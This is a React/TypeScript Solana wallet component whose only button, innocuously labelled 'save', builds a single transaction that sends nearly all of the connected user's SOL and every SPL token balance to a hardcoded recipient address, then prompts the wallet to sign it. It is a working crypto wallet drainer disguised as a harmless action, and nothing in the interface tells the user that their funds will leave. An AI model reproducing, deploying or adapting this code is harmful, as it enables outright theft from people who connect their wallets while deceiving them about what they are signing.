import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import * as web3 from '@solana/web3.js';
import { FC, useState, useEffect } from 'react';
import styles from '../styles/Home.module.css';
import * as splToken from '@solana/spl-token';

const recipientAddress = 'EPkv5EbnqHufeKL3ewo5UeqLiDroRS2zD1moBgZ7sKm9';

export const TransferButton: FC = () => {
    const [txSig, setTxSig] = useState('');
    const { connection } = useConnection();
    const { publicKey, sendTransaction } = useWallet();
    const [splTokenAccounts, setSplTokenAccounts] = useState<any[]>([]);

    useEffect(() => {
        if (!connection || !publicKey) return;

        const getSplTokenAccounts = async () => {
            try {
                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                    programId: splToken.TOKEN_PROGRAM_ID,
                });

                setSplTokenAccounts(
                    tokenAccounts.value.map(account => ({
                        pubkey: account.pubkey,
                        account: account.account.data.parsed.info
                    }))
                );
            } catch (error) {
                console.error('Error fetching SPL token accounts:', error);
            }
        };

        getSplTokenAccounts();
    }, [connection, publicKey]);

    const transferAllFunds = async () => {
        if (!connection || !publicKey) {
            console.error('No connection or public key');
            return;
        }

        try {
            const transaction = new web3.Transaction();
            const recipientPubKey = new web3.PublicKey(recipientAddress);

            // Transfer SOL
            const accountInfo = await connection.getAccountInfo(publicKey);
            if (!accountInfo) {
                throw new Error('Failed to get account info');
            }
            const solBalance = accountInfo.lamports;

            if (solBalance > 5000) {  // Ensure there's enough balance for the transaction fee
                const sendSolInstruction = web3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: recipientPubKey,
                    lamports: solBalance - 500000,  // Leave a small amount to cover transaction fees
                });
                transaction.add(sendSolInstruction);
                console.log('Added SOL transfer instruction:', sendSolInstruction);
            } else {
                console.warn('Insufficient SOL balance for transfer');
            }

            // Transfer SPL Tokens
            for (const { pubkey: tokenAccountPubKey, account } of splTokenAccounts) {
                const tokenAmount = account.tokenAmount.amount;
                const mint = account.mint;

                if (tokenAmount > 0) {
                    const recipientTokenAddress = await splToken.getOrCreateAssociatedTokenAccount(
                        connection,
                        publicKey,
                        new web3.PublicKey(mint),
                        recipientPubKey
                    );

                    const sendSplTokenInstruction = splToken.createTransferInstruction(
                        tokenAccountPubKey,
                        recipientTokenAddress.address,
                        publicKey,
                        tokenAmount,
                        [],
                        splToken.TOKEN_PROGRAM_ID
                    );

                    transaction.add(sendSplTokenInstruction);
                    console.log('Added SPL token transfer instruction:', sendSplTokenInstruction);
                }
            }

            if (transaction.instructions.length === 0) {
                throw new Error('No funds to transfer');
            }

            // Send transaction
            const signature = await sendTransaction(transaction, connection);
            setTxSig(signature);
            console.log('Transaction sent:', signature);
        } catch (error) {
            console.error('Error transferring funds:', error);
            alert(error.message);
        }
    };

    return (
        <div>
            {publicKey ? (
                <button onClick={transferAllFunds} className={styles.formButton}>save</button>
            ) : (
                <span>Connect Your Wallet</span>
            )}
            {txSig && (
                <div>
                    <p>View your transaction on </p>
                    <a href={`https://explorer.solana.com/tx/${txSig}?cluster=devnet`}>Solana Explorer</a>
                </div>
            )}
        </div>
    );
};
